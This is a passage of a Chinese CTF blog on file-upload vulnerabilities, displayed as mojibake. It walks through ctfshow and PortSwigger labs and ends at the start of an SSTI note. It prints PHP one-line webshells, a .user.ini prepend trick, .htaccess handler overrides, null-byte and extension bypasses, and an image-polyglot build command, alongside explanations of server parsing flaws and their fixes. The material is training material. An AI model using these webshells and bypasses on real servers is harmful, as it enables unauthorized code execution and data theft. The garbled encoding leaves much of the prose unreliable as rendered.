auto_prepend_file=shell.pngshell.png ?php @eval($_POST[shell]);? å¼€å§‹åšé¢˜ï¼šå…ˆä¸Šä¼ .user.ini.pngæ–‡ä»¶ï¼Œå¹¶æŠ“åŒ…ï¼Œä¿®æ”¹åç§°ï¼š.user.iniï¼Œç„¶åæ”¾åŒ… æ¥ç€å†ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œæœ€åå°±å¯ä»¥ç”¨èšå‰‘è¿æ¥ /upload/ï¼Œç„¶åè·å–åˆ°flag ctfshow-web154155é¦–å…ˆæŒ‰ç…§ä¸Šé¢˜æ­¥éª¤ä¸Šä¼  .user.iniæ–‡ä»¶æˆåŠŸï¼Œç„¶åä¸Šä¼ å›¾ç‰‡é©¬å¤±è´¥ï¼Œæ ¹æ®é¢˜è§£è¯´æ˜¯è¿‡æ»¤äº†phpï¼Œäºæ˜¯å¯ä»¥è¯•è¯•çŸ­æ ‡ç­¾ï¼Œå¦‚ä¸‹ï¼š å¯ç”¨ä½¿ç”¨?=(è¡¨è¾¾å¼)?è¿›è¡Œç»•è¿‡ï¼Œ?=(è¡¨è¾¾å¼)? ç­‰ä»·äº ?php echo (è¡¨è¾¾å¼)? äºæ˜¯å›¾ç‰‡å†…å®¹å˜ä¸ºï¼š?=eval($_POST[shell]);?ï¼Œä¸Šä¼ æˆåŠŸï¼Œç”¨èšå‰‘è¿æ¥ä¸€ä¸‹ /upload/ï¼Œç„¶åè·å–åˆ°flag ctfshow-web156é¦–å…ˆæŒ‰ç…§ä¸Šé¢˜æ­¥éª¤ä¸Šä¼  .user.iniæ–‡ä»¶æˆåŠŸï¼Œç„¶åä¸Šä¼ å›¾ç‰‡é©¬å¤±è´¥ï¼Œè‡ªå·±æµ‹è¯•å®åœ¨æ²¡æœ‰å‘ç°è¿‡æ»¤äº†ä»€ä¹ˆï¼Œçœ‹äº†æåŠäººåæ‰æ˜ç™½è¿‡æ»¤æ‰äº†[]ï¼Œåœ¨phpä¸­æŸ¥çœ‹æ•°ç»„ä¹Ÿå¯ä»¥ç”¨{}ï¼Œæ‰€ä»¥åªè¦æŠŠå›¾ç‰‡é©¬å†…å®¹ä¸­çš„[]å…¨éƒ¨æ”¹æˆ{}ï¼Œç„¶åå†ä¸Šä¼ å°±å¯ä»¥äº† ctfshow-web157158[] , ; éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¯¼è‡´ä¸èƒ½ä½¿ç”¨èšå‰‘æ¥è¿›è¡Œè¿æ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¿œç¨‹ä»£ç æ‰§è¡Œ é¦–å…ˆæŒ‰ç…§ä¸Šé¢å‡ é¢˜ä¸€æ ·å…ˆä¸Šä¼  .user.iniæ–‡ä»¶ï¼Œç„¶åå…ˆä¸Šä¼ å›¾ç‰‡é©¬å†…å®¹ä¸ºï¼š?=system(ls ../)?æŸ¥çœ‹åˆ°flagçš„ä½ç½®ï¼Œå› ä¸ºphpä¹Ÿè¢«ç¦æ­¢æ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨é€šé…ç¬¦???æˆ–è€…*æ¥ä»£æ›¿phpï¼Œå†…å®¹ä¸ºï¼š?=system(cat ../flag.*|base64)?ï¼Œå†æ‹¿å»base64è§£ç åå°±å¯ä»¥å¾—åˆ°flagäº† Apacheè§£ææ¼æ´æ­¤æ¼æ´å®é™…ä¸ºäººä¸ºçš„é”™è¯¯é…ç½®å¯¼è‡´çš„æ¼æ´ï¼Œä¸Apacheæœ¬èº«æ— å…³ Apacheå¯¹å¤šåç¼€æ–‡ä»¶çš„è¯†åˆ«æ¦‚æ‹¬æ¥è¯´ä¸ºï¼š Apacheå…è®¸æ–‡ä»¶æœ‰å¤šä¸ªæ‰©å±•åï¼Œå¹¶ä¸”ä¼šå°†æ‰€æœ‰åç¼€åè¿›è¡Œè¯†åˆ«ï¼Œè¯†åˆ«çš„é¡ºåºä¸ºï¼šä»å³åˆ°å·¦ å¦‚ï¼š .html.fr æ˜ å°„åˆ° Content-Type: text/html å’ŒContent-Language: deã€‚ Apacheå…è®¸æ‰©å±•åæ˜ å°„åˆ°å…ƒæ•°æ®(åŒ…æ‹¬ï¼šè¯­è¨€ã€å†…å®¹ç±»å‹ã€å­—ç¬¦é›†æˆ–ç¼–ç )ã€å¤„ç†ç¨‹åºã€‚ å¦‚ .html æ˜ å°„åˆ° Content-Type: text/htmlã€‚ å¯¹äºç›¸åŒç±»å‹å…ƒæ•°æ®ï¼Œä»¥ä»å³åˆ°å·¦ç¬¬ä¸€ä¸ªå‡ºç°çš„ä¸ºå‡†ï¼Œä½†å¯¹äºè¯­è¨€å’Œå†…å®¹ç¼–ç å¯ç´¯ç§¯çš„å…ƒæ•°æ®ï¼Œå°†ä¼šå åŠ  å¦‚ï¼š.gif.htmlæ ¹æ®æ­¤è§„åˆ™æ˜ å°„åˆ° Content-Type: text/htmlã€‚ .html.en.deæ ¹æ®æ­¤è§„åˆ™æ˜ å°„åˆ°Content-Language: en, de å’Œ Content-Type: text/html ç”±äºæ˜ å°„åˆ°å¤„ç†ç¨‹åºå’Œæ˜ å°„åª’ä½“ç±»å‹ï¼Œæœ€åçš„è¿”å›ç»“æœä¸ä¸€è‡´ï¼ˆä¸€ä¸ªä¸ºç»è¿‡ç¨‹åºå¤„ç†ï¼Œä¸€ä¸ªä¸ºè¿”å›åª’ä½“æ–‡ä»¶ï¼‰ã€‚å½“å‡ºç°ä¸åŒæ‰©å±•åæ˜ å°„åˆ°å¤„ç†ç¨‹åºå’Œåª’ä½“ç±»å‹æ—¶ï¼Œæ˜ å°„åˆ°å¤„ç†ç¨‹åºçš„ä¼˜å…ˆç­‰çº§é«˜äºæ˜ å°„åˆ°åª’ä½“ç±»å‹ å¦‚ï¼š.imap.htmlæ‰©å±•å.imap æ˜ å°„åˆ°å¤„ç†ç¨‹åº imap-fileï¼Œ .html æ˜ å°„åˆ°Content-Type: text/html ï¼Œæ ¹æ®ä¸Šè¿°åŸåˆ™ï¼Œ.imap.htmlæ–‡ä»¶ä¼šè¢«imap-fileç¨‹åºå¤„ç† ä½¿ç”¨ Add* æŒ‡ä»¤ï¼ŒApacheå¤„ç†ä¸€ä¸ªæ–‡ä»¶æ—¶ä¼šåº”ç”¨ä¸Šè¿°è§„åˆ™ Add* æŒ‡ä»¤æŒ‡çš„æ˜¯å¦‚ï¼šAddTypeã€AddDefaultCharsetã€AddEncodingã€AddHandlerã€AddOutputFilterã€AddLanguageã€AddCharsetç­‰æŒ‡ä»¤ï¼Œå…¶ä¸­AddHandlerè®¾ç½®å¯¹åº”åç¼€åæ˜ å°„åˆ°å¤„ç†ç¨‹åºï¼Œå¦‚ï¼š AddHandler application/x-httpd-php .php ç”±æ­¤ï¼Œå½“ç”¨æˆ·ä¸Šä¼ ä¸€ä¸ªa.php.jpgæ–‡ä»¶æ—¶ï¼ŒApaceçš„é…ç½®æ–‡ä»¶ä¸­åŒ…å«AddHandlerå¤„ç†PHPæ–‡ä»¶ï¼Œä¸”æœªå¯¹ä¸Šä¼ åçš„æ–‡ä»¶è¿›è¡Œé‡å‘½åï¼Œæ­¤æ—¶a.php.jpgè¢«è§£æä¸ºä¸€ä¸ªPHPè„šæœ¬ï¼Œè§£ææ¼æ´ç”±æ­¤è€Œæ¥ è§£æé…ç½®æ¼æ´æ¡ä»¶ æ–‡ä»¶æ²¡æœ‰è¢«é‡å‘½å Apacheä¸­é…ç½®ä¸­å«æœ‰AddHandlerçš„è®¾ç½® è§£æé…ç½®æ¼æ´è§£å†³åŠæ³• å°†ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½å æ ¹æ®å®˜æ–¹æ–‡æ¡£çš„è¯´æ˜ï¼Œå¯ä»¥ä½¿ç”¨SetHandleræŒ‡ä»¤æ¥ä»£æ›¿AddHandlerï¼Œå› ä¸ºSetHandlerä»…æ ¹æ®æœ€å³ç«¯çš„åç¼€åæ¥åˆ¤æ–­æ˜ å°„çš„å¤„ç†ç¨‹åº å½±å“ç‰ˆæœ¬ apache 1.x apache 2.2.x IIS6.0è§£ææ¼æ´IIS6.0è§£ææ¼æ´åˆ†ä¸¤ç§ï¼š 1ã€ç›®å½•è§£æï¼š ä»¥xx.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å°†ä¼šè¢«å½“æˆASPæ–‡ä»¶æ‰§è¡Œã€‚ 2ã€æ–‡ä»¶è§£æï¼š xx.asp;.jpg åƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨;åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆxx.aspæ–‡ä»¶æ‰§è¡Œã€‚ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ .asa .cer .cdxã€‚ IIS7.0 | IIS7.5 | Nginxçš„è§£ææ¼æ´åŸç† Nginxæ‹¿åˆ°æ–‡ä»¶è·¯å¾„ï¼ˆæ›´ä¸“ä¸šçš„è¯´æ³•æ˜¯URIï¼‰/test.jpg/test.phpåï¼Œä¸€çœ‹åç¼€æ˜¯.phpï¼Œä¾¿è®¤ä¸ºè¯¥æ–‡ä»¶æ˜¯phpæ–‡ä»¶ï¼Œè½¬äº¤ç»™phpå»å¤„ç†ã€‚phpä¸€çœ‹/test.jpg/test.phpä¸å­˜åœ¨ï¼Œä¾¿åˆ å»æœ€åçš„/test.phpï¼Œåˆçœ‹/test.jpgå­˜åœ¨ï¼Œä¾¿æŠŠ/test.jpgå½“æˆè¦æ‰§è¡Œçš„æ–‡ä»¶äº†ï¼Œåˆå› ä¸ºåç¼€ä¸º.jpgï¼Œphpè®¤ä¸ºè¿™ä¸æ˜¯phpæ–‡ä»¶ï¼Œäºæ˜¯è¿”å›Access deniedã€‚ è¿™å…¶ä¸­æ¶‰åŠåˆ°phpçš„ä¸€ä¸ªé€‰é¡¹ï¼šcgi.fix_pathinfoï¼Œè¯¥å€¼é»˜è®¤ä¸º1ï¼Œè¡¨ç¤ºå¼€å¯ã€‚å¼€å¯è¿™ä¸€é€‰é¡¹PHPå¯ä»¥å¯¹æ–‡ä»¶è·¯å¾„è¿›è¡Œä¿®ç†ã€‚ ä¸¾ä¸ªä¾‹å­ï¼Œå½“phpé‡åˆ°æ–‡ä»¶è·¯å¾„1.jpg2.txt3.phpæ—¶ï¼Œè‹¥1.jpg2.txt3.phpä¸å­˜åœ¨ï¼Œåˆ™ä¼šå»æ‰æœ€åçš„3.phpï¼Œç„¶ååˆ¤æ–­1.jpg2.txtæ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™æŠŠ1.jpg2.txtå½“åšæ–‡ä»¶1.jpg2.txt3.phpï¼Œè‹¥1.jpg2.txtä»ä¸å­˜åœ¨ï¼Œåˆ™ç»§ç»­å»æ‰2.txtï¼Œä»¥æ­¤ç±»æ¨ã€‚ æ¼æ´å½¢å¼www.xxxxx.com/UploadFiles/image/1.jpg/1.php å¦å¤–ä¸¤ç§è§£ææ¼æ´www.xxxxx.com/UploadFiles/image/1.jpg%00.php` `www.xxxxx.com/UploadFiles/image/1.jpg/%20\\0.php æ¡ä»¶ç«äº‰æ¼æ´æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿã€‚ ä¸Šä¼ æ–‡ä»¶æºä»£ç é‡Œæ²¡æœ‰æ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ–‡ä»¶ç›´æ¥ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸåæ‰è¿›è¡Œåˆ¤æ–­ï¼šå¦‚æœæ–‡ä»¶æ ¼å¼ç¬¦åˆè¦æ±‚ï¼Œåˆ™é‡å‘½åï¼Œå¦‚æœæ–‡ä»¶æ ¼å¼ä¸ç¬¦åˆè¦æ±‚ï¼Œå°†æ–‡ä»¶åˆ é™¤ã€‚ ç”±äºæœåŠ¡å™¨å¹¶å‘å¤„ç†(åŒæ—¶)å¤šä¸ªè¯·æ±‚ï¼Œå‡å¦‚aç”¨æˆ·ä¸Šä¼ äº†æœ¨é©¬æ–‡ä»¶ï¼Œç”±äºä»£ç æ‰§è¡Œéœ€è¦æ—¶é—´ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­bç”¨æˆ·è®¿é—®äº†aç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¼šæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š 1.è®¿é—®æ—¶é—´ç‚¹åœ¨ä¸Šä¼ æˆåŠŸä¹‹å‰ï¼Œæ²¡æœ‰æ­¤æ–‡ä»¶ã€‚ 2.è®¿é—®æ—¶é—´ç‚¹åœ¨åˆšä¸Šä¼ æˆåŠŸä½†è¿˜æ²¡æœ‰è¿›è¡Œåˆ¤æ–­ï¼Œè¯¥æ–‡ä»¶å­˜åœ¨ã€‚ 3.è®¿é—®æ—¶é—´ç‚¹åœ¨åˆ¤æ–­ä¹‹åï¼Œæ–‡ä»¶è¢«åˆ é™¤ï¼Œæ²¡æœ‰æ­¤æ–‡ä»¶ã€‚ äºŒæ¬¡æ¸²æŸ“æ¼æ´äºŒæ¬¡æ¸²æŸ“åŸç† åœ¨æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åï¼Œç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸è¦æ±‚ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šæŠŠé‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢æ›´æ–°ï¼Œå¤„ç†å®Œæˆåï¼Œæ ¹æ®æˆ‘ä»¬åŸæœ‰çš„å›¾ç‰‡ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡å¹¶æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤ºã€‚ ç»•è¿‡1ã€é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ï¼š å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ç½‘ç«™äºŒæ¬¡å¤„ç†åçš„å›¾ç‰‡ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚è¿™æ ·äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­å°±å­˜åœ¨äº†ä¸€å¥è¯ï¼Œåœ¨é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è·å–webshellã€‚ 2ã€å¯ä»¥é…åˆæ¡ä»¶ç«äº‰ï¼š è¿™é‡ŒäºŒæ¬¡æ¸²æŸ“çš„é€»è¾‘å­˜åœ¨æ¼æ´ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†åˆ¤æ–­ï¼Œç¬¦åˆå°±ä¿å­˜ï¼Œä¸ç¬¦åˆåˆ é™¤ï¼Œå¯åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œçˆ†ç ´ä¸Šä¼  å¦‚ä½•åˆ¤æ–­å›¾ç‰‡æ˜¯å¦è¿›è¡Œäº†äºŒæ¬¡å¤„ç†å¯¹æ¯”è¦ä¸Šä¼ å›¾ç‰‡ä¸ä¸Šä¼ åçš„å›¾ç‰‡å¤§å°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡æŸ¥çœ‹ä¸Šä¼ åä¿ç•™äº†å“ªäº›æ•°æ®ï¼ŒæŸ¥çœ‹é‚£äº›æ•°æ®è¢«æ”¹å˜ã€‚ åˆ©ç”¨æ–‡ä»¶ä¸Šä¼ å®ç°æ—¥å¿—åŒ…å«ä»è€Œè¿æ¥èšå‰‘bpå®æˆ˜Labï¼šé€šè¿‡ Web Shell ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç é¢˜ç›®è¦æ±‚ï¼šè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ PHP Web Shell å¹¶ä½¿ç”¨å®ƒæ¥æ³„éœ²æ–‡ä»¶ /home/carlos/secret çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤æœºå¯† é¦–å…ˆæˆ‘ä»¬å…ˆç™»å½•è´¦å·ï¼Œå‘ç°æœ‰ä¸ªå¤´åƒå›¾ç‰‡ä¸Šä¼ åŠŸèƒ½ï¼Œå¼€å¯proxyæ’ä»¶ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œç„¶ååˆ°ä»£ç†æ¨¡å—ä¸­çš„httpå†å²è®°å½•ï¼Œé€‰ä¸­/my-account/avataræ¡ç›®å‘é€åˆ°é‡æ”¾å™¨ä¸­ï¼Œç„¶åæ›´æ”¹è¿‡æ»¤å™¨é…ç½®å¦‚ä¸‹ï¼š åº”ç”¨å‘ç°å¤šäº†ä¸€æ¡ç›®ï¼Œæ˜¯æ˜¾ç¤ºå›¾ç‰‡çš„ï¼Œä¹Ÿå‘é€åˆ°é‡æ”¾å™¨ä¸­ ç¬¬ä¸€ä¸ªæ–‡ä»¶ä¿®æ”¹æˆå¦‚ä¸‹å†…å®¹ï¼š ç„¶åç¬¬äºŒä¸ªæ–‡ä»¶æ›´æ”¹ä¸€ä¸‹filenameï¼Œå†å‘é€ä¸€éï¼Œä¾¿å¾—åˆ°äº†æ‰€éœ€è¦çš„æœºå¯† Labï¼šé€šè¿‡ç»•è¿‡ Content-Type é™åˆ¶ä¸Šä¼  Web shellå’Œä¸Šé¢˜ä¸ä¸€æ ·çš„åœ°æ–¹å°±æ˜¯å¤šäº†å¯¹Conten-Typeçš„æ£€æŸ¥ï¼Œè¦æ±‚å¿…é¡»æ˜¯å›¾ç‰‡ç±»å‹çš„æ‰å¯ä»¥ å…¶ä½™çš„æ“ä½œæ­¥éª¤ä¸ä¸Šé¢˜ä¸€è‡´ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯evalå‡½æ•°é‡Œé¢ç›´æ¥æ¥è¯­å¥çš„è¯è¦æœ‰åŒå¼•å·åŒ…æ‹¬æ‰å¯ä»¥ Labï¼šé€šè¿‡è·¯å¾„éå†è¿›è¡ŒWeb shellä¸Šä¼ è¦æ±‚ï¼šè¯¥å®éªŒå®¤åŒ…å«ä¸€ä¸ªå­˜åœ¨æ¼æ´çš„å›¾åƒä¸Šä¼ åŠŸèƒ½ã€‚æœåŠ¡å™¨è¢«é…ç½®ä¸ºé˜»æ­¢æ‰§è¡Œç”¨æˆ·æä¾›çš„æ–‡ä»¶ï¼Œä½†å¯ä»¥é€šè¿‡åˆ©ç”¨ç¬¬äºŒä¸ªæ¼æ´æ¥ç»•è¿‡æ­¤é™åˆ¶ã€‚è¦å®Œæˆè¯¥å®éªŒï¼Œè¯·ä¸Šä¼ ä¸€ä¸ªåŸºæœ¬çš„ PHP Web shell å¹¶ä½¿ç”¨å®ƒæ¥çªƒå–æ–‡ä»¶ /home/carlos/secret çš„å†…å®¹ã€‚ä½¿ç”¨å®éªŒå®¤æ¨ªå¹…ä¸­æä¾›çš„æŒ‰é’®æäº¤æ­¤æœºå¯† é¦–å…ˆå¦‚æœæˆ‘ä»¬ç›´æ¥æŒ‰ç…§å‰ä¸¤é¢˜çš„æ­¥éª¤æ¥åšè¯¥é¢˜çš„è¯ï¼Œä¼šå‘ç°é¡µé¢ä¼šç›´æ¥å›æ˜¾ç»™æˆ‘ä»¬è¾“å…¥çš„ä»£ç å†…å®¹ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œ å‘ç°ä¸Šä¼ å›¾ç‰‡çš„æ¨¡å—ä¸­çš„filenameå¯ä»¥éšæ„ä¿®æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç»™è¯¥æ–‡ä»¶æ¢ä¸ªåœ°æ–¹ï¼Œå¦‚ä¸‹ï¼š å‘ç°æˆ‘ä»¬è¾“å…¥çš„è¢«ç›´æ¥å¤„ç†æ‰äº† å†å°è¯•ä¸€ä¸‹è¿›è¡Œurlç¼–ç è¯•è¯•ï¼Œå¦‚ä¸‹ï¼š æˆåŠŸä¸Šä¼ è¯¥æ–‡ä»¶ï¼Œäºæ˜¯æˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹è¯¥æ–‡ä»¶ï¼Œç»“æœå¦‚ä¸‹ï¼š æ‹¿åˆ°æœºå¯†ï¼Œé¢˜ç›®è§£å†³ Labï¼šé€šè¿‡æ‰©å±•é»‘åå•ç»•è¿‡ä¸Šä¼ Web shellæ­£å¸¸ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åï¼Œæˆ‘ä»¬å°†å…¶æ”¹ä¸ºphpåç¼€çš„æ–‡ä»¶å†æ¬¡è¿›è¡Œä¸Šä¼ ï¼Œå‘ç°é¡µé¢ä¼šå›æ˜¾ä¸å…è®¸phpåç¼€çš„æ–‡ä»¶ä¸Šä¼  äºæ˜¯å°è¯•å°†åç¼€åæ”¹ä¸º.php4ï¼ŒæˆåŠŸä¸Šä¼ ï¼Œä½†å‘ç°é¡µé¢ä¼šç›´æ¥å›æ˜¾ç»™æˆ‘ä»¬è¾“å…¥çš„ä»£ç å†…å®¹ï¼Œå¹¶ä¸ä¼šæ‰§è¡Œè¯¥ä»£ç  è¿™æ—¶å€™æˆ‘æƒ³åˆ°äº†å¯ä»¥é€šè¿‡ä¸Šä¼ .user.iniæ–‡ä»¶æ¥è¿›è¡Œç»•è¿‡ï¼Œäºæ˜¯è¿›è¡Œå°è¯•ï¼Œä½†æ˜¯å‘ç°é¡µé¢è¿˜æ˜¯ç›´æ¥å›æ˜¾è¾“å…¥çš„ä»£ç å†…å®¹ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆè¡Œä¸é€šï¼‰ã€‚ä¸‡å¹¸æˆ‘ä»¬è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ .htaccessæ¥ç»•è¿‡ï¼Œè¯¥æ–‡ä»¶å…·ä½“å†…å®¹å¦‚ä¸‹ï¼š AddType application/x-httpd-php .txt åç¼€ä¸º.txtçš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpä»£ç æ‰§è¡Œï¼Œäºæ˜¯æˆ‘ä»¬ä¸Šä¼  ç„¶åbpè®¿é—®è¯¥urlï¼Œå¾—åˆ°æœºå¯†ï¼Œè§£å†³é¢˜ç›® Labï¼šé€šè¿‡æ··æ·†çš„æ–‡ä»¶æ‰©å±•åä¸Šä¼  Web shellæœ€å¼€å§‹æ˜¯æƒ³ç€æŒ‰ç…§ä¸Šé¢˜çš„æ€è·¯å…ˆä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œä½†æ˜¯ä¸Šä¼ å¤±è´¥ï¼Œé¡µé¢å›æ˜¾åªå…è®¸åç¼€åä¸ºpngæˆ–è€…jpgçš„æ–‡ä»¶ä¸Šä¼  ä½†æ˜¯è¿™é¢˜çš„filenameæˆ‘ä»¬æ˜¯å¯ä»¥æ”¹çš„ï¼Œæ‰€ä»¥è¿™é¢˜æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨00æˆªæ–­æ¥ç»•è¿‡ï¼Œå¦‚ä¸‹ï¼š ç„¶åç›´æ¥è®¿é—®shell.phpï¼Œå¾—åˆ°æœºå¯†ï¼Œé¢˜ç›®è§£å†³ Labï¼šé€šè¿‡å¤šè¯­è¨€ Web Shell ä¸Šä¼ è¿œç¨‹æ‰§è¡Œä»£ç é¢˜ç›®ä¸­æåˆ°ï¼šå°½ç®¡å®ƒä¼šæ£€æŸ¥æ–‡ä»¶çš„å†…å®¹ä»¥éªŒè¯å®ƒæ˜¯å¦æ˜¯çœŸæ­£çš„å›¾åƒï¼Œä½†ä»ç„¶å¯ä»¥ä¸Šä¼ å’Œæ‰§è¡ŒæœåŠ¡å™¨ç«¯ä»£ç ã€‚ è¯´æ˜åç«¯ä¼šæ£€æŸ¥å›¾ç‰‡çš„å†…å®¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•åšä¸€ä¸ªå›¾ç‰‡é©¬ é¦–å…ˆä¸Šä¼ ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡ï¼Œç„¶ååˆ°bpçš„ä»£ç†æ¨¡å—ä¸­çš„HTTPå†å²è®°å½•é‡Œé¢å°†æ˜¾ç¤ºå›¾ç‰‡çš„æ¡ç›®å‘é€åˆ°é‡æ”¾å™¨é‡Œé¢ æ¥ç€åœ¨æœ¬æœºä¸Šé¢å°†ä¸€å¼ å›¾ç‰‡å’Œä¸€ä»½phpä»£ç æ–‡ä»¶åˆæˆå›¾ç‰‡é©¬ï¼Œå¦‚ä¸‹ï¼š å‘½ä»¤ï¼ˆç”¨cmdï¼Œåœ¨æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ï¼‰ï¼š copy a.png /b + a.php /a 3.php /b:æŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ï¼Œç”¨äºå›¾åƒæˆ–è€…å£°éŸ³ç±»æ–‡ä»¶/a:æŒ‡å®šä»¥asciiæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ç”¨äºtxtç­‰æ–‡æœ¬ç±»æ–‡ä»¶ æ³¨ï¼šè¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯ï¼šé€šè¿‡copyå‘½ä»¤ï¼ŒæŠŠa.pngå›¾ç‰‡æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ·»åŠ åˆ°a.phpæ–‡ä»¶ä¸­ï¼Œä»¥ASCIIæ–‡æœ¬æ–‡ä»¶å½¢å¼è¾“å‡ºä¸º3.phpæ–‡ä»¶ã€‚ æ¥ç€å°†è¿™ä»½æ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œå¹¶åœ¨bpä¸­è¿›è¡Œè®¿é—®ï¼Œå¾—åˆ°æˆ‘ä»¬æ‰€éœ€è¦çš„æœºå¯†ï¼Œé¢˜ç›®è§£å†³ å€Ÿé‰´è¶…è¯¦ç»†æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“åˆ†æï¼šhttps://cloud.tencent.com/developer/article/1938541 è¶…è¯¦ç»†æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“åˆ†æ WELLâ€™s blog","categories":["CTF"]},{"title":"sstiå­¦ä¹ ","path":"/2024/03/01/sstiå­¦ä¹ /","content":"å¸¸ç”¨é­”æœ¯æ–¹æ³•__class____class__ï¼šç”¨æ¥æŸ¥çœ‹å˜é‡æ‰€å±çš„ç±»ï¼Œæ ¹æ®å‰é¢çš„å˜é‡å½¢å¼å¯ä»¥å¾—åˆ°å…¶æ‰€å±çš„ç±»ã€‚ __class__ æ˜¯ç±»çš„ä¸€ä¸ªå†…ç½®å±æ€§ï¼Œè¡¨ç¤ºç±»çš„ç±»å‹ï¼Œè¿”å› type type ï¼› ä¹Ÿæ˜¯ç±»çš„å®ä¾‹çš„å±æ€§ï¼Œè¡¨ç¤ºå®ä¾‹å¯¹è±¡çš„ç±»ã€‚ .__class__type str ().__class__type tuple [].__class__type list .__class__type dict è·å–åŸºç±»__bases__ï¼šç”¨æ¥æŸ¥çœ‹ç±»çš„åŸºç±»ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ•°ç»„ç´¢å¼•æ¥æŸ¥çœ‹ç‰¹å®šä½ç½®çš„å€¼ã€‚ é€šè¿‡è¯¥å±æ€§å¯ä»¥æŸ¥çœ‹è¯¥ç±»çš„æ‰€æœ‰ç›´æ¥çˆ¶ç±»ï¼Œè¯¥å±æ€§è¿”å›æ‰€æœ‰ç›´æ¥çˆ¶ç±»ç»„æˆçš„å…ƒç»„ï¼ˆè™½ç„¶åªæœ‰ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚æ³¨æ„æ˜¯ç›´æ¥çˆ¶ç±»ï¼ï¼ï¼ ().__class__.__bases__(type object,) .__class__.__bases__(type basestring,) [].__class__.__bases__(type object,) .__class__.__bases__(type object,) .__class__.__bases__[0].__bases__[0] // python2ä¸‹ä¸python3ä¸‹ä¸åŒtype object [].__class__.__bases__[0]type object è·å–åŸºç±»è¿˜èƒ½ç”¨ __mro__ æ–¹æ³•ï¼Œ__mro__ 